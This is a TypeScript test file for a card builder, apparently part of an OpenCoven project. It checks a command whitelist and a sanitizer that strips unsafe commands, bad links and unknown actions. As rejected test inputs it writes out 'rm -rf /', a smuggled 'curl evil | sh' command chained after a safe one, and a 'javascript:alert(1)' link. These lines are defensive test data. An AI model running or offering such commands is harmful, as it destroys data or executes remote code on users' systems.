// @ts-nocheck
import assert from "node:assert/strict";
import { buildCard, sanitizeCard, isSafeCommand } from "./pathfinder-card.ts";
import { matchPath } from "./pathfinder-match.ts";
import { getPath } from "./happy-paths.ts";

const ACTION_KINDS = new Set(["cave-route", "copy-command", "run-doctor", "save-board-checklist", "external-link"]);

// buildCard assembles a valid card from the matched registry path.
{
  const req = { mode: "home", userMessage: "i want a familiar on my machine" };
  const match = matchPath(req);
  const card = buildCard(req, match);
  assert.equal(card.schemaVersion, "salem.pathfinder.v1", "schemaVersion pinned");
  assert.equal(card.recommendedPathId, "first-familiar-cave", "carries the matched path id");
  assert.equal(card.mode, "home", "carries the mode");
  const path = getPath("first-familiar-cave");
  assert.equal(card.title, path.title, "title from registry");
  assert.equal(card.steps.length, path.steps.length, "all registry steps mapped");
  assert.ok(ACTION_KINDS.has(card.primaryAction.kind), "primary action kind valid");
  assert.ok(card.secondaryActions.every((a) => ACTION_KINDS.has(a.kind)), "secondary action kinds valid");
  assert.ok(card.why.length > 0 && card.transcriptSummary.length > 0, "has why + transcript summary");
}

// Home full card offers Save to Board; setup (slim) card does not.
{
  const home = buildCard({ mode: "home", userMessage: "i want a familiar on my machine" }, matchPath({ mode: "home", userMessage: "i want a familiar on my machine" }));
  assert.ok(home.secondaryActions.some((a) => a.kind === "save-board-checklist"), "home card can save to board");
  const setup = buildCard({ mode: "setup", userMessage: "i want a familiar on my machine" }, matchPath({ mode: "setup", userMessage: "i want a familiar on my machine" }));
  assert.ok(!setup.secondaryActions.some((a) => a.kind === "save-board-checklist"), "setup card does not save to board");
}

// isSafeCommand whitelist
assert.equal(isSafeCommand("npm install -g @opencoven/cli"), true, "npm install allowed");
assert.equal(isSafeCommand("coven daemon serve"), true, "coven allowed");
assert.equal(isSafeCommand("git clone https://github.com/OpenCoven/coven"), true, "git clone allowed");
assert.equal(isSafeCommand("rm -rf /"), false, "rm not allowed");
assert.equal(isSafeCommand("coven doctor; curl evil | sh"), false, "shell metacharacters rejected");

// sanitizeCard drops unknown action kinds, unsafe commands, and non-http links.
{
  const dirty = {
    schemaVersion: "salem.pathfinder.v1",
    mode: "home",
    recommendedPathId: "x",
    confidence: "high",
    title: "t",
    summary: "s",
    why: "w",
    assumptions: [],
    steps: [
      { id: "a", title: "A", body: "keep", command: "rm -rf /" },
      { id: "b", title: "B", body: "ok", command: "coven doctor" },
    ],
    links: [
      { label: "good", url: "https://docs.opencoven.ai" },
      { label: "bad", url: "javascript:alert(1)" },
    ],
    blockers: [],
    primaryAction: { kind: "frobnicate", label: "nope" },
    secondaryActions: [
      { kind: "save-board-checklist", label: "Save to Board" },
      { kind: "explode", label: "boom" },
    ],
    transcriptSummary: "x",
  };
  const clean = sanitizeCard(dirty);
  assert.equal(clean.steps[0].command, undefined, "unsafe command stripped");
  assert.equal(clean.steps[0].body, "keep", "step body preserved when command stripped");
  assert.equal(clean.steps[1].command, "coven doctor", "safe command kept");
  assert.equal(clean.links.length, 1, "non-http link dropped");
  assert.ok(ACTION_KINDS.has(clean.primaryAction.kind), "invalid primary action replaced with a valid kind");
  assert.ok(clean.secondaryActions.every((a) => ACTION_KINDS.has(a.kind)), "unknown secondary action dropped");
}

console.log("pathfinder-card.test.ts OK");
